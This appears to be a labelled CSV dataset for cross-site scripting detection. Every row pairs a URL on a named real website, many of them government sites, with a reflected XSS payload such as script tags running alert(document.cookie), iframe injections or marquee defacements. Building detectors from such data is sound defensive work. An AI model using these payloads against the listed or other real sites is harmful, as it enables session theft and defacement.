Sentence,Label
http://www.nwce.gov.uk/search_process.php?keyword=%22%3e%3cscript%3ealert%28document.cookie%29%3b%3c<br>%2fscript%3e,1
http://www.manchester.gov.uk/site/scripts/google_results.php?q=%22%3e%253cscript%3ealert%28document.<br>cookie%29%3b%253c%2fscript%3e&amp;btng=search&amp;ie=&amp;site=&amp;output=xml&amp;client=&amp;lr=&amp;oe=&amp;filter=0,1
http://www.ldsmissions.com/us/index.php?action=missionary.info%3cmarquee%3epappy%3c/marquee%3e&amp;missi<br>onary_id=69,1
http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\%22%3e%3cscript%3ealert(docume<br>nt.cookie);%3c/script%3e&amp;subdwell=&amp;dwelling=&amp;streetnm=&amp;locality=&amp;hometown=&amp;postcode=&amp;datebrth=&amp;learn<br>gen=&amp;ethnicor=&amp;tel_numb=&amp;tel_mob=&amp;email_add=&amp;email_add2=&amp;agree_info=&amp;username=&amp;password=&amp;err=sur,1
http://www.northwarks.gov.uk/site/scripts/google_results.php?q=%22%3e%253cscript%3ealert%28document.<br>cookie%29%3b%253c%2fscript%3e&amp;btng=search&amp;ie=&amp;site=&amp;output=xml&amp;client=&amp;lr=&amp;oe=&amp;filter=0,1
http://www.chaoticwars.co.uk/register.php?ref='%3e%3ciframe%20src=http://google.com%3e,1
http://www.waverley.gov.uk/site/scripts/google_results.php?q=%22%3e%253cscript%3ealert%28document.co<br>okie%29%3b%253c%2fscript%3e,1
http://battleofthevalley.com/register.php?ref='&gt;&lt;iframe%20src=http://google.com&gt;,1
http://www.cincinnatibell.com/search/default.asp?query=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;bu<br>siness=true,1
http://walkmyplank.net/signup.php?ref=%22%3e%3ciframe%20src=http://google.com%3e%3cfont%20color=red%<br>3e,1
http://www.locumco.com.au/register.php?show=pharm&amp;tertmenu=%22;%3c/script%3e%3cscript%3ealert(docume<br>nt.cookie);&lt;/script&gt;&lt;script&gt;,1
https://www.scriptlance.com/cgi-bin/freelancers/search.cgi?cats=36&quot;&gt;a&lt;/a&gt;&lt;marquee&gt;pappy was<br>here&lt;/marquee&gt;,1
http://www.ectswsr.com.au/register.php?id=24%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,1
http://www.harrow.gov.uk/site/scripts/google_results.php?q=%22%3e%253cscript%3ealert%28document.cook<br>ie%29%3b%253c%2fscript%3e&amp;btng=search&amp;ie=&amp;site=&amp;output=xml&amp;client=&amp;lr=&amp;oe=&amp;filter=0,1
http://www.fife.gov.uk/topics/index.cfm?fuseaction=straydogs.list&amp;subjectid=a6dea850-1d42-47be-9e75f<br>1d7b465ac63&amp;subjectid=a6dea850-1d42-47be-9e75f1d7b465ac63&amp;breed=&amp;coat=&amp;colour=%22%3e%3cscript%3ealer<br>t%28document.cookie%29%3b%3c%2fscript%3e&amp;location=&amp;finddogs=go,1
http://www.icteach.com.au/register.php?id=55%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,1
http://visualarts.qld.gov.au/designyourowntour/register.php?user=found&amp;message=username%20already%20<br>exists%20in%20database&amp;requsername=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://visualarts.qld.gov.au/designyourowntour/list.php?message=%3cscript%3ealert(document.cookie);%<br>3c/script%3e,1
http://criminalmadness.net/register.php?ref=test'%3e%3ciframe%20src=http://google.com%3e,1
http://www.sovrep.gov.by/index.php/main.html?sstring=%3cscript%3ealert(document.cookie);%3c/script%3<br>e%3e,1
http://www.corp-gov.ru/forum/index.php3?node_id=1936%22%3etest%3c/a%3e%3cscript%3ealert(document.coo<br>kie);%3c/script%3e&amp;startrow=%22%3e%3c/a%3etesticles%3cscript%3ealert(document.cookie);%3c/script%3e,1
http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=%22%3e%3cscript%3ealert(documen<br>t.cookie);%3c/script%3e,1
http://ufo.gov.ru/search/?string=%3cscript%3ealert(document.cookie);%3c/script%3e%3e,1
http://prima-tv.ru/search/?string=&quot;&gt;&lt;iframe+src=http://google.com&gt;,1
http://www.ttdaren.gov.tw/daren/instpage.php?r=&amp;w=&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;h=&lt;script<br>&gt;alert(document.cookie);&lt;/script&gt;&amp;url=google.com&gt;&lt;/iframe&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles%22%3ea%3c/a%3e%3cscript%3ealert(<br>document.cookie);%3c/script%3e,1
http://www.podzem.ru/send.php?f_feedbackname=%3cscript%3ealert(document.cookie);%3c/script%3e,1
http://www.realtimeworlds.com/index.php?id=4&amp;pid=4&amp;nid=%3cscript%3ealert(document.cookie);%3c/script<br>%3e,1
http://www.gofreecredit.com/report.php?id=9915&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;b=lp168&quot;&gt;&lt;s<br>cript&gt;alert(document.cookie);&lt;/script&gt;&amp;lte=all&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;subid=ftr+t<br>y&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://kone-liga.ru/search/?q=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://izhmoto.ru/default/search_results?what=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,1
http://www.tass-ural.ru/register.php?email=&quot;&gt;&lt;script&gt;alert('u');&lt;/script&gt;&lt;script&gt;alert('s');&lt;/script<br>&gt;&lt;script&gt;alert('a');&lt;/script&gt;&lt;script&gt;alert('pappy was here!');&lt;/script&gt;,1
http://www.allo.perm.ru/site?resource=%3cscript%3ealert('pappy%20was%20here!');%3c/script%3e,1
http://tpshop.ru/index.php?page_key=price_search&amp;group_id=0&amp;q=test%3c%2ftitle%3e%3cscript%3ealert%28<br>%27pappy+was+here%21%27%29%3b%3c%2fscript%3e&amp;in_mark=1&amp;in_title=1&amp;price_min=&amp;price_max=&amp;orderby=titl<br>e&amp;order=asc,1
http://antonys.irk.ru/register.php?email=%3cscript%3ealert(document.cookie);%3c/script%3e%3e,1
http://stringer.ru/search.mhtml?search=&quot;&gt;&lt;marquee&gt;pappy was here&lt;/marquee&gt;&lt;!--%3cscript%3ealert(document.cookie);%<br>3c/script%3e,1
http://dentarusshop.ru/show_fine.php?select=name&amp;name=%3cscript%3ealert(document.cookie);%3c/script%<br>3e,1
http://www.motorsale.ru/search/?searchtxt=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,1
http://www.memorec.ru/register.php?sesid=blah'%3etest%3c/a%3e%3cscript%3ealert(document.cookie);%3c/<br>script%3e,1
http://ga1.org/ntu_action/join.tcl?qp_source=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,1
http://www.thetaxreliefsite.com/?refid=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://enable.nat.gov.tw/valid.jsp?category=testicles%22%3ea%3c/a%3e%3cscript%3ealert(document.cooki<br>e);%3c/script%3e,1
http://www.knoxcounty.org/search/sresults.php?search=%22%29%3balert%28document.cookie%29%3b%2f%2f,1
http://www.globalgateway.com/search.asp?criteria=%3cscript%3ealert%28document.cookie%29%3b%3c%2fscri<br>pt%3e,1
